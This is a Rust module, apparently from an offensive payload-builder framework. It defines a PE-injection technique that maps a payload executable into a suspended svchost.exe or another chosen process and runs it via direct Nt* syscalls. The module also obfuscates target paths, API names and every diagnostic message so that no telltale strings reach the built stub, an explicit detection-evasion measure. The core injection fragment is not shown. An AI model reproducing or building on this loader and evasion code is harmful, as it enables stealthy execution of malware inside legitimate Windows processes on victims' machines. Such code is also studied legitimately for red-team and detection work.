//! PE injection.
//!
//! Maps a full PE image into a freshly created, suspended process and starts it
//! at its entry point, without unmapping the target's original image: the
//! payload is a second image in private memory, run on a thread of its own. See
//! `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for PE injection: which payload to run (the payload format and
/// export live in the payload's `build.payloads` entry).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
    /// Process to create, suspend and inject into.
    #[serde(default = "default_target")]
    pub target: String,
    /// How long to wait for the payload, in milliseconds; `0` waits forever.
    ///
    /// The target's own thread is never resumed, so a payload that hangs would
    /// hang the whole chain. A bounded wait turns that into an error instead;
    /// the target itself is left behind (the syscall layer has no
    /// `NtTerminateProcess` helper to clean it up with).
    #[serde(default)]
    pub timeout_ms: u32,
}

impl Default for Params {
    /// Defaults to injecting into `svchost.exe` (see [`default_target`]).
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a runtime step with no `params:` mapping gets the default
    /// struct, not the field-level defaults.
    fn default() -> Self {
        Self {
            payload: None,
            target: default_target(),
            timeout_ms: 0,
        }
    }
}

/// The default injection target: a process every Windows install has.
pub fn default_target() -> String {
    "C:\\Windows\\System32\\svchost.exe".to_string()
}

/// Static metadata for PE injection.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "pe_injection",
    attck: &["T1055.002"],
    // The payload's TLS (index, template, per-thread slot and
    // DLL_PROCESS_ATTACH callbacks) is provisioned through a target-resident
    // prologue, matching process hollowing. Both the plain and the
    // TLS-callback e2e are green on x64 (the callback path needed a
    // 16-byte-aligned stack for the emulated call; see `build_prologue`).
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/pe_injection/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[super::PayloadFormat::Pe],
    requires_indirect_syscalls: false,
    params_example: r#"technique: pe_injection
params:
  target: "C:\\Windows\\System32\\notepad.exe"
  timeout_ms: 30000"#,
    readme: include_str!("README.md"),
    // Only what the fragment actually issues: the payload runs on a thread of
    // its own, so nothing resumes, suspends or reads the target's own thread,
    // and the image is written without ever reading the target back.
    syscalls: &[
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtQueryInformationThread",
        "NtQueryInformationProcess",
        "NtWaitForSingleObject",
        "NtClose",
    ],
    // The payload's imports must be resolved and written into its IAT before
    // the target runs it, exactly like process hollowing.
    resolves_imports: true,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all a technique keyword
/// such as `loader` — lands in the generated stub's `.rdata`. Messages that
/// interpolate a value keep a keyword-free `format!` literal at the call site
/// (`format!` cannot take a runtime format string) and take the label from
/// here.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_PAYLOAD_TOO_SMALL$", "payload too small to be a PE"),
    ("$MSG_BAD_DOS$", "invalid DOS header (missing MZ signature)"),
    ("$MSG_BAD_NT$", "invalid NT header (missing PE signature)"),
    ("$MSG_BAD_ARCH$", "unsupported architecture"),
    ("$MSG_BAD_OPT_MAGIC$", "unsupported optional-header magic"),
    (
        "$MSG_BAD_IMAGE_SIZE$",
        "inconsistent SizeOfImage in the payload headers",
    ),
    ("$MSG_HEADERS_OOB$", "headers out of bounds"),
    ("$MSG_NO_ENTRY$", "the payload declares no entry point"),
    ("$MSG_SECTION_TABLE_OOB$", "section table out of bounds"),
    (
        "$MSG_RELOC_TABLE_UNMAPPED$",
        "could not map the relocation table to a file offset",
    ),
    ("$MSG_RELOC_TABLE_OOB$", "relocation table out of bounds"),
    ("$MSG_BAD_RELOC_BLOCK$", "malformed relocation block"),
    (
        "$MSG_RESOLVE_IMPORTS$",
        "could not resolve the payload's imports",
    ),
    (
        "$MSG_IAT_SLOT_NOT_MAPPED$",
        "the IAT slot is not mapped at RVA",
    ),
    (
        "$MSG_IMPORT_DIR_UNMAPPED$",
        "import directory is not mapped",
    ),
    ("$MSG_DLL_NAME_UNMAPPED$", "DLL name is not mapped"),
    ("$MSG_DLL_NAME_UNTERMINATED$", "unterminated DLL name"),
    ("$MSG_BAD_KERNEL32_NAME$", "invalid kernel32 name"),
    ("$MSG_BAD_EXPORT_NAME$", "invalid export name"),
    ("$MSG_KERNEL32_NOT_FOUND$", "could not locate kernel32"),
    (
        "$MSG_KERNEL32_EXPORT_NOT_FOUND$",
        "could not resolve a kernel32 export",
    ),
    ("$MSG_BAD_DLL_NAME$", "invalid DLL name"),
    ("$MSG_DLL_RELOAD_FAILED$", "could not load the DLL here"),
    (
        "$MSG_DLL_FILE_MISMATCH$",
        "the target's copy is a different file",
    ),
    ("$MSG_MODULE_PATH_FAILED$", "could not read a module path"),
    ("$MSG_DLL_NAME_ALLOC_FAILED$", "DLL-name allocation failed"),
    ("$MSG_DLL_NAME_WRITE_FAILED$", "DLL-name write failed"),
    ("$MSG_LOAD_DLL_FAILED$", "could not load"),
    ("$MSG_DLL_LOAD_UNFINISHED$", "loading did not finish"),
    ("$MSG_DLL_NOT_MAPPED$", "the target did not map"),
    (
        "$MSG_SNAPSHOT_FAILED$",
        "could not enumerate the target's modules",
    ),
    ("$MSG_CREATE_PROCESS_FAILED$", "CreateProcessA failed"),
    ("$MSG_ALLOC_FAILED$", "allocation failed"),
    ("$MSG_WRITE_FAILED$", "could not write"),
    ("$MSG_SECTION_DATA_OOB$", "section data out of bounds"),
    ("$MSG_HEADERS_PROTECT_FAILED$", "header protection failed"),
    ("$MSG_SECTION_PROTECT_FAILED$", "section protection failed"),
    ("$MSG_THREAD_FAILED$", "could not start the payload thread"),
    (
        "$MSG_TEB_READ_FAILED$",
        "could not read the payload thread's information",
    ),
    ("$MSG_WAIT_FAILED$", "waiting for the target failed"),
    (
        "$MSG_WAIT_TIMEOUT$",
        "timed out waiting for the payload to exit",
    ),
    (
        "$MSG_EXIT_STATUS_FAILED$",
        "could not read the target's exit status",
    ),
    ("$MSG_THREAD_FAULTED$", "the payload thread faulted"),
    (
        "$MSG_TLS_DIR_UNMAPPED$",
        "the payload's TLS directory is not mapped",
    ),
    (
        "$MSG_TLS_BLOCK_ALLOC_FAILED$",
        "TLS block allocation failed",
    ),
    (
        "$MSG_TLS_TEMPLATE_UNMAPPED$",
        "the payload's .tls template is not mapped",
    ),
    (
        "$MSG_TLS_TEMPLATE_OOB$",
        "the payload's .tls template is out of bounds",
    ),
    (
        "$MSG_TLS_INDEX_FAILED$",
        "the target could not allocate a TLS index",
    ),
    (
        "$MSG_TLSALLOC_RUN_FAILED$",
        "could not run TlsAlloc in the target",
    ),
    ("$MSG_TLSALLOC_UNFINISHED$", "TlsAlloc did not finish"),
    ("$MSG_TLSALLOC_FAILED$", "TlsAlloc failed in the target"),
    (
        "$MSG_TLS_CALLBACKS_UNMAPPED$",
        "the payload's TLS callback array is not mapped",
    ),
    (
        "$MSG_TLS_CALLBACKS_UNTERMINATED$",
        "the payload's TLS callback array is not null-terminated",
    ),
    (
        "$MSG_TLS_PROLOGUE_ALLOC_FAILED$",
        "TLS prologue allocation failed",
    ),
    (
        "$MSG_TLS_PROLOGUE_PROTECT_FAILED$",
        "TLS prologue protection failed",
    ),
    ("$MSG_OFFSET_OVERFLOW$", "offset overflow"),
    ("$MSG_READ_OOB$", "read out of bounds"),
    ("$MSG_WRITE_OOB$", "write out of bounds"),
];

impl Params {
    /// Renders the PE-injection stub fragment for these parameters.
    ///
    /// The per-build target path, the `kernel32.dll` / `LoadLibraryA` names the
    /// remote-DLL load resolves through, the wait timeout and every diagnostic
    /// are substituted as code that rebuilds the value at runtime (using
    /// `strings`'s active strategy), so none of them appears in the generated
    /// stub in cleartext.
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        _format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("inject_target");
        let kernel32_def = strings
            .obfuscate("kernel32.dll")
            .render_stub_expr("kernel32_name");
        let load_library_def = strings
            .obfuscate("LoadLibraryA")
            .render_stub_expr("load_library_name");
        let tls_alloc_def = strings
            .obfuscate("TlsAlloc")
            .render_stub_expr("tls_alloc_name");

        // The error paths get the same treatment as the target path and the
        // resolved names: a `format!` literal is keyword-free, and the message
        // itself is rebuilt at runtime, so nothing sensitive reaches `.rdata`.
        let mut rendered = DEF
            .stub_fragment
            .replace("$TARGET_DEF$", &target_def)
            .replace("$KERNEL32_DEF$", &kernel32_def)
            .replace("$LOAD_LIBRARY_DEF$", &load_library_def)
            .replace("$TLS_ALLOC_DEF$", &tls_alloc_def)
            .replace("$TIMEOUT_MS$", &format!("{}u32", self.timeout_ms));
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
